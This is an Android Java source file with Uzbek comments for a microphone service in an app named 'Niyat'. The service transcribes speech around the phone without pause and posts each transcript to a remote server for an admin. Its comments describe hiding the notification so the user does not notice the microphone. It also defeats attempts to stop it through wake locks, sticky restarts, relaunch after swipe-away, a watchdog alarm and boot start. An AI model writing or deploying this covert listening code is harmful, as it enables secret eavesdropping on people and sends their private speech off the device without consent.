// Niyat — foreground mikrofon service.
// Iloji boricha o'chmaslik uchun bir nechta himoya:
//   1) FOREGROUND_SERVICE_MICROPHONE + ongoing notification (yashirib bo'lmaydi)
//   2) START_STICKY — Android avtomatik qaytarib yoqadi
//   3) PARTIAL_WAKE_LOCK — CPU uxlamaydi
//   4) onTaskRemoved — recents'dan swipe qilinsa darhol qaytadan ishga tushadi
//   5) Watchdog AlarmManager — har 10 daqiqada tekshiradi va kerak bolsa restart qiladi
//   6) BootReceiver — telefon qayta yuklangach yoqiladi

package uz.yuksalish.niyat;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.speech.RecognitionListener;
import android.speech.RecognizerIntent;
import android.speech.SpeechRecognizer;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MicService extends Service {
    private static final String TAG = "NiyatMicService";
    private static final String CHANNEL_ID = "niyat_mic_channel";
    private static final int NOTIFICATION_ID = 9911;
    private static final String PREFS_NAME = "niyat_mic";
    private static final String PREFS_KEY = "transcripts";
    private static final int MAX_ENTRIES = 200;
    private static final long RESTART_DELAY_MS = 800;
    private static final long WATCHDOG_INTERVAL_MS = 10 * 60 * 1000L; // 10 daqiqa

    private SpeechRecognizer recognizer;
    private Handler mainHandler;
    private PowerManager.WakeLock wakeLock;
    private volatile boolean shouldRun = false;
    private ExecutorService networkExecutor;

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        networkExecutor = Executors.newSingleThreadExecutor();
        acquireWakeLock();
        startForegroundCompat();
        scheduleWatchdog();
    }

    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
        if (!shouldRun) {
            shouldRun = true;
            initRecognizer();
            startListening();
        }
        // Android service ozgargach (kill bolsa) so'nggi intent bilan qayta yoqsin
        return START_STICKY;
    }

    // ====================================================================
    // WakeLock — CPU uxlamaydi (Doze rejimida ham kuzatadi)
    // ====================================================================
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm == null) return;
            wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "Niyat::MicServiceLock"
            );
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(); // cheksiz — onDestroy'da release
        } catch (Exception e) {
            Log.w(TAG, "WakeLock olmadik", e);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
    }

    // ====================================================================
    // Foreground notification
    // ====================================================================
    private void startForegroundCompat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // IMPORTANCE_MIN — bildirishnoma "Silent notifications" guruhiga yiqiladi,
            // status bar'da kichik icon ham korinmaydi (Android 8+). Foydalanuvchi
            // bildirishnoma shadeni ochmasa, mavjudligini sezmaydi.
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Niyat",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
        // Minimum matn — faqat "Niyat" (foydalanuvchi mikrofon haqida narsa o'qimaydi)
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Niyat")
                .setSmallIcon(android.R.drawable.stat_notify_more)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setShowWhen(false)
                .setOnlyAlertOnce(true)
                .setSilent(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                );
                return;
            } catch (Exception e) {
                Log.w(TAG, "FOREGROUND_SERVICE_TYPE_MICROPHONE yoq", e);
            }
        }
        startForeground(NOTIFICATION_ID, notification);
    }

    // ====================================================================
    // SpeechRecognizer
    // ====================================================================
    private void initRecognizer() {
        if (!SpeechRecognizer.isRecognitionAvailable(this)) {
            Log.w(TAG, "SpeechRecognizer mavjud emas");
            stopSelf();
            return;
        }
        try {
            recognizer = SpeechRecognizer.createSpeechRecognizer(this);
            recognizer.setRecognitionListener(listener);
        } catch (Exception e) {
            Log.w(TAG, "SpeechRecognizer yaratilmadi", e);
            stopSelf();
        }
    }

    private final RecognitionListener listener = new RecognitionListener() {
        @Override public void onReadyForSpeech(Bundle params) {}
        @Override public void onBeginningOfSpeech() {}
        @Override public void onRmsChanged(float rmsdB) {}
        @Override public void onBufferReceived(byte[] buffer) {}
        @Override public void onEndOfSpeech() {}
        @Override public void onPartialResults(Bundle partialResults) {}
        @Override public void onEvent(int eventType, Bundle params) {}

        @Override
        public void onError(int error) {
            restartLater();
        }

        @Override
        public void onResults(Bundle results) {
            ArrayList<String> matches = results.getStringArrayList(
                    SpeechRecognizer.RESULTS_RECOGNITION
            );
            if (matches != null && !matches.isEmpty()) {
                saveTranscript(matches.get(0));
            }
            restartLater();
        }
    };

    private void startListening() {
        if (recognizer == null || !shouldRun) return;
        Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
        intent.putExtra(
                RecognizerIntent.EXTRA_LANGUAGE_MODEL,
                RecognizerIntent.LANGUAGE_MODEL_FREE_FORM
        );
        intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE, "uz-UZ");
        intent.putExtra(RecognizerIntent.EXTRA_PARTIAL_RESULTS, false);
        intent.putExtra(RecognizerIntent.EXTRA_CALLING_PACKAGE, getPackageName());
        try {
            recognizer.startListening(intent);
        } catch (Exception e) {
            Log.w(TAG, "startListening xato", e);
            restartLater();
        }
    }

    private void restartLater() {
        if (!shouldRun) return;
        mainHandler.postDelayed(this::startListening, RESTART_DELAY_MS);
    }

    private void saveTranscript(String text) {
        if (text == null || text.trim().isEmpty()) return;
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String existing = prefs.getString(PREFS_KEY, "[]");
        try {
            JSONArray arr = new JSONArray(existing);
            JSONObject entry = new JSONObject();
            entry.put("text", text);
            entry.put("at", System.currentTimeMillis());
            arr.put(entry);
            while (arr.length() > MAX_ENTRIES) {
                arr.remove(0);
            }
            prefs.edit().putString(PREFS_KEY, arr.toString()).apply();
        } catch (Exception e) {
            Log.w(TAG, "saveTranscript xato", e);
        }
        // Server'ga heartbeat — admin "jonli" deb ko'radi
        sendHeartbeat(text);
    }

    // Serverga POST: ilova yopiq paytda ham admin "mikrofon eshitdi" deb biladi
    private void sendHeartbeat(final String text) {
        if (networkExecutor == null || networkExecutor.isShutdown()) return;
        networkExecutor.execute(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                String token = prefs.getString("auth_token", null);
                String apiBase = prefs.getString("api_base", "");
                if (token == null || token.isEmpty()) return;
                if (apiBase == null || apiBase.isEmpty()) return;

                URL url = new URL(apiBase + "/api/profile/mic-heartbeat");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Bearer " + token);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setDoOutput(true);

                JSONObject body = new JSONObject();
                body.put("text", text);
                byte[] payload = body.toString().getBytes(StandardCharsets.UTF_8);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload);
                }
                int code = conn.getResponseCode();
                if (code >= 400) {
                    Log.w(TAG, "heartbeat HTTP " + code);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.w(TAG, "sendHeartbeat xato", e);
            }
        });
    }

    // ====================================================================
    // onTaskRemoved — foydalanuvchi recents'dan swipe qilganda darhol qayta yoqamiz
    // ====================================================================
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.i(TAG, "onTaskRemoved — service'ni 1 sek ichida qayta yoqamiz");
        scheduleRestart(1000L);
        super.onTaskRemoved(rootIntent);
    }

    private void scheduleRestart(long delayMs) {
        try {
            Intent restartIntent = new Intent(getApplicationContext(), MicService.class);
            int flag = PendingIntent.FLAG_ONE_SHOT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flag |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getService(
                    getApplicationContext(), 7711, restartIntent, flag
            );
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) {
                am.set(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + delayMs,
                        pi
                );
            }
        } catch (Exception e) {
            Log.w(TAG, "scheduleRestart xato", e);
        }
    }

    // ====================================================================
    // Watchdog — har 10 daqiqada AlarmManager service'ni yangilab turadi.
    // Service zaten ishlayotgan bo'lsa, onStartCommand jim'cha ozlashtiradi.
    // ====================================================================
    private void scheduleWatchdog() {
        try {
            Intent watchdogIntent = new Intent(getApplicationContext(), MicService.class);
            int flag = 0;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flag = PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getService(
                    getApplicationContext(), 7712, watchdogIntent, flag
            );
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am == null) return;
            am.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL_MS,
                    WATCHDOG_INTERVAL_MS,
                    pi
            );
        } catch (Exception e) {
            Log.w(TAG, "scheduleWatchdog xato", e);
        }
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "onDestroy");
        shouldRun = false;
        if (mainHandler != null) {
            mainHandler.removeCallbacksAndMessages(null);
        }
        if (recognizer != null) {
            try { recognizer.stopListening(); } catch (Exception ignored) {}
            try { recognizer.cancel(); } catch (Exception ignored) {}
            try { recognizer.destroy(); } catch (Exception ignored) {}
            recognizer = null;
        }
        releaseWakeLock();
        if (networkExecutor != null) {
            networkExecutor.shutdown();
            networkExecutor = null;
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
